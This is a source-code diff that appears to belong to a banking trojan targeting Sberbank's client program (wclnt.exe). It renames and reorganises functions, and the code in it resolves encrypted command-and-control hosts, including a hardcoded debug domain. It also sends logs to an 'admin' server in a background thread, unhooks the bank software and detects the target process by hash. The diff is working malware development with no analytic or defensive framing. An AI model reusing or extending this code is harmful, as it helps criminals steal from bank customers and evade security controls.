@@ -117,11 +117,12 @@ static PCHAR GetNameDll(char* uid)
 	return path;
 }
 
-static char* GetAdminUrl( char* url )
+static char* SberGetAdminUrl( char* url )
 {
 #ifdef DEBUGCONFIG
 	m_lstrcpy( url, "az.zika.in" ); //"bifit-dbo.ru" );
 #else
+
 	string host = GetActiveHostFromBuf2( SBER_HOSTS, 0x15D1BD02 /* __SBER_HOSTS__ */, SBERHOSTS_PARAM_ENCRYPTED );
 	if( !host.IsEmpty() )
 		m_lstrcpy( url, host.t_str() );
@@ -143,12 +144,6 @@ static void SendLogToAdmin( int num )
 	HTTPResponse::Clear(&Response);
 }
 
-// Функция отправляет лог в отдельном потоке
-static DWORD WINAPI SendLogToAdminThread( LPVOID num )
-{
-	SendLogToAdmin( (int)num );
-	return 0;
-}
 
 //если есть DLL_FROM_DISK, то функция возвращает имя файла
 #ifdef DLL_FROM_DISK
@@ -451,9 +446,9 @@ static void CopyFolderForVersion( const char* appName )
 }
 
 //инициализирует глобальные переменные 
-static bool InitData()
+static bool SberInitData()
 {
-	if( GetAdminUrl(domain) == 0 ) return false;
+	if( SberGetAdminUrl(domain) == 0 ) return false;
 	string user = GetAzUser();
 	m_lstrcpy( azUser, user.t_str() );
 	return true;
@@ -463,7 +458,7 @@ bool Init( const char* appName, DWORD appHash )
 {
 	if ( appHash == 0x321ecf12 /*wclnt.exe*/ )
 	{
-		if( InitData() ) 
+		if( SberInitData() )
 		{
 			SendLogToAdmin(1);
 			UnhookSber();
@@ -493,7 +488,7 @@ static char* GetPathSber( char* path )
 bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
 	char path[MAX_PATH];
-	InitData();
+	SberInitData();
 	if( GetPathSber(path) )
 	{
 		pPathAppendA( path, "wclnt.exe" );
@@ -502,11 +497,19 @@ bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	return 0;
 }
 
+
+// Функция отправляет лог в отдельном потоке
+static DWORD WINAPI SendLogToAdminThread( LPVOID num )
+{
+	if (Sber::SberInitData())
+		SendLogToAdmin( (int)num );
+	return 0;
+}
+
 //отсылает в лог 0, если есть в реестре ветка сбера
 void SendLogIfReestr()
 {
 	char path[MAX_PATH];
-	InitData();
 	if( GetPathSber(path) )
 		StartThread( SendLogToAdminThread, 0 );
 }
